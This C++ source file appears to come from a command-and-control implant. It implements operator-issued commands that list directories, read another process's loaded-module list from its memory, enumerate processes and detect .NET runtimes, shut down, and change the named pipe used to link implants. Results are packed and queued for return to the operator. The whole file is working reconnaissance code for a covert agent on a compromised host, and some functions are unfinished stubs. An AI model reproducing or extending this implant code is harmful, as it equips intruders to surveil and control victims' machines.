#include "C:\Program Files (x86)\Windows Kits\NETFXSDK\4.8\Include\um\metahost.h"
#include <core/corelib.hpp>

namespace Commands {

    VOID DirectoryList (PPARSER Parser) {
        HEXANE

        PSTREAM Outbound        = Stream::CreateStreamWithHeaders(TypeResponse);
        LPSTR Target            = { };
        LPSTR Path              = { };
        ULONG PathSize          = { };

        HANDLE File             = { };
        WIN32_FIND_DATAA Next   = { };
        ULARGE_INTEGER FileSize = { };
        SYSTEMTIME FileTime     = { };
        SYSTEMTIME SysTime      = { };

        Stream::PackDword(Outbound, CommandDir);

        Target  = Parser::UnpackString(Parser, nullptr);
        Path    = R_CAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH));

        if (Target[0] == PERIOD) {
            if (!(PathSize = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, Path))) {
                return_defer(ERROR_DIRECTORY);
            }
            if (Path[PathSize - 1] != BSLASH) {
                Path[PathSize++] = BSLASH;
            }

            Path[PathSize++]  = ASTER;
            Path[PathSize]    = NULTERM;
        } else {
            x_memcpy(Path, Target, MAX_PATH);
        }

        if ((File = Ctx->win32.FindFirstFileA(Path, &Next)) == INVALID_HANDLE_VALUE) {
            return_defer(ERROR_FILE_NOT_FOUND);
        }

        do {
            if(
                !Ctx->win32.FileTimeToSystemTime(&Next.ftLastAccessTime, &FileTime) ||
                !Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &FileTime, &SysTime)) {
                return_defer(ERROR_INVALID_TIME);
            }

            if (Next.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                Stream::PackDword(Outbound, TRUE);

            } else {
                FileSize.HighPart   = Next.nFileSizeHigh;
                FileSize.LowPart    = Next.nFileSizeLow;

                Stream::PackDword(Outbound, FALSE);
                Stream::PackDword64(Outbound, FileSize.QuadPart);
            }

            Stream::PackDword(Outbound, FileTime.wMonth);
            Stream::PackDword(Outbound, FileTime.wDay);
            Stream::PackDword(Outbound, FileTime.wYear);
            Stream::PackDword(Outbound, SysTime.wHour);
            Stream::PackDword(Outbound, SysTime.wMinute);
            Stream::PackDword(Outbound, SysTime.wSecond);
            Stream::PackString(Outbound, Next.cFileName);

        } while (Ctx->win32.FindNextFileA(File, &Next) != 0);

        Message::OutboundQueue(Outbound);

        defer:
        if (File) {
            Ctx->win32.FindClose(File);
        }
        if (Path) {
            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Path);
        }
    }

    VOID ProcessModules (PPARSER Parser) {
        HEXANE

        PSTREAM Outbound                  = Stream::CreateStreamWithHeaders(TypeResponse);
        PPEB_LDR_DATA LdrData           = { };
        PROCESS_BASIC_INFORMATION pbi   = { };
        HANDLE Process                  = { };
        ULONG Pid                       = { };

        PLIST_ENTRY Head 	            = { };
        PLIST_ENTRY Entry               = { };
        LDR_DATA_TABLE_ENTRY cMod       = { };

        CHAR ModNameA[MAX_PATH] 		= { };
        WCHAR ModNameW[MAX_PATH] 	    = { };

        INT Counter = 0;
        SIZE_T Size = 0;

        Stream::PackDword(Outbound, CommandMods);

        if (
            !(Pid       = Process::GetProcessIdByName(Parser::UnpackString(Parser, nullptr))) ||
            !(Process   = Process::NtOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, Pid))) {
            return_defer(ERROR_PROCESS_IS_PROTECTED);
        }

        if (NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(Process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr)) ) {

            if (
                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, &pbi.PebBaseAddress->Ldr, &LdrData, sizeof(PPEB_LDR_DATA), &Size)) ||
                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, &LdrData->InMemoryOrderModuleList.Flink, &Entry, sizeof(PLIST_ENTRY), nullptr))) {
                return_defer(ntstatus);
            }

            Head = &LdrData->InMemoryOrderModuleList;
            while (Entry != Head) {
                if (
                    !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, CONTAINING_RECORD(Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &cMod, sizeof(LDR_DATA_TABLE_ENTRY), nullptr)) ||
                    !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, cMod.FullDllName.Buffer, &ModNameW, cMod.FullDllName.Length, &Size)) ||
                    Size != cMod.FullDllName.Length) {
                    return_defer(ntstatus);
                }

                if (cMod.FullDllName.Length > 0) {
                    Size = x_wcstombs(ModNameA, ModNameW, cMod.FullDllName.Length);

                    Stream::PackString(Outbound, ModNameA);
                    Stream::PackDword64(Outbound, R_CAST(UINT64, cMod.DllBase));
                    Counter++;
                }

                x_memset(ModNameW, 0, MAX_PATH);
                x_memset(ModNameA, 0, MAX_PATH);

                Entry = cMod.InMemoryOrderLinks.Flink;
            }
        }

        Message::OutboundQueue(Outbound);
        defer:
    }

    VOID ProcessList(PPARSER Parser) {
        HEXANE

        PSTREAM Stream              = Stream::CreateStreamWithHeaders(TypeResponse);
        PROCESSENTRY32 Entries      = { };
        HANDLE Snapshot             = { };
        HANDLE hProcess             = { };

        IEnumUnknown *pEnum         = { };
        ICLRMetaHost *pMetaHost     = { };
        ICLRRuntimeInfo *pRuntime   = { };

        WCHAR Buffer[1024];
        DWORD Size  = 0;
        DWORD Type  = Parser::UnpackDword(Parser); // listing managed/un-managed processes

        Size            = ARRAY_LEN(Buffer);
        Entries.dwSize  = sizeof(PROCESSENTRY32);

        if (
            (Snapshot = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE ||
            !Ctx->win32.Process32First(Snapshot, &Entries)) {
            return;
        }

        do {
            BOOL isManaged  = FALSE;
            BOOL isLoaded   = FALSE;

            CLIENT_ID Cid           = { };
            OBJECT_ATTRIBUTES Attr  = { };

            Cid.UniqueThread    = nullptr;
            Cid.UniqueProcess   = R_CAST(HANDLE, Entries.th32ProcessID);

            InitializeObjectAttributes(&Attr, nullptr, 0, nullptr, nullptr);
            if (!NT_SUCCESS(Ctx->Nt.NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &Attr, &Cid))) {
                continue;
            }

            if (SUCCEEDED(Ctx->win32.CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost)))) {
                if (SUCCEEDED(pMetaHost->EnumerateInstalledRuntimes(&pEnum))) {

                    while (S_OK == pEnum->Next(1, R_CAST(IUnknown **, &pRuntime), nullptr)) {
                        if (pRuntime->IsLoaded(hProcess, &isLoaded) == S_OK && isLoaded == TRUE) {
                            isManaged = TRUE;

                            if (Type == MANAGED_PROCESS && SUCCEEDED(pRuntime->GetVersionString(Buffer, &Size))) {
                                Stream::PackDword(Stream, Entries.th32ProcessID);
                                Stream::PackString(Stream, Entries.szExeFile);
                                Stream::PackWString(Stream, Buffer);
                            }
                        }
                        pRuntime->Release();
                    }
                }
            }

            if (!isManaged && Type == UNMANAGED_PROCESS) {
                Stream::PackDword(Stream, Entries.th32ProcessID);
                Stream::PackString(Stream, Entries.szExeFile);
            }

            if (pMetaHost) { pMetaHost->Release(); }
            if (pRuntime) { pRuntime->Release(); }
            if (pEnum) { pEnum->Release(); }

            Ctx->Nt.NtClose(hProcess);
        } while (Ctx->win32.Process32Next(Snapshot, &Entries));

        if (Snapshot) {
            Ctx->Nt.NtClose(Snapshot);
        }
    }

    VOID Shutdown (PPARSER Parser) {
        HEXANE

        // Send final message
        // Zero/Free all memory
        // Exit
        ntstatus = ERROR_EXIT;
    }

    VOID UpdatePeer(PPARSER Parser) {
        HEXANE

        auto nameLength = x_wcslen(Ctx->Config.IngressPipename) * sizeof(WCHAR);
        if (Ctx->Config.IngressPipename) {

            x_memset(Ctx->Config.IngressPipename, 0, nameLength);
            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Ctx->Config.IngressPipename);
        }

        Parser::ParserWcscpy(Parser, &Ctx->Config.IngressPipename, nullptr);
    }
}
